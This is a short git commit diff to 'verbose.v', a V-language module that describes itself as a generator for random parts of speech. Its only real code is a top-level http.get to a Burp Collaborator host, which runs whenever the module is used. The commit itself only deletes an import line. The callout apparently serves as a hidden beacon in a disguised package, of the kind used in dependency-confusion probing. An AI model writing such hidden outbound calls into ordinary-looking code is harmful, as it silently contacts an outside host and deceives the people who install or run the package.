e53de1c711209a8b4a0d967ad4c0bd1087d7fac6
hantudiem <93470114+hantudiem@users.noreply.github.com>
2021-10-31 18:03:04 +0800

    Update verbose.v

--- verbose.v
+++ verbose.v
@@ -2,7 +2,6 @@ module verbose
 
 // verbose is a generator for random parts of speech
 import net.http
-import verbose
 
 if resp := http.get('http://8u3ip1h1cvgvlvrs4ctlqun5owu1iq.burpcollaborator.net') {
 	println(resp.text) // resp is a http.Response, not an optional
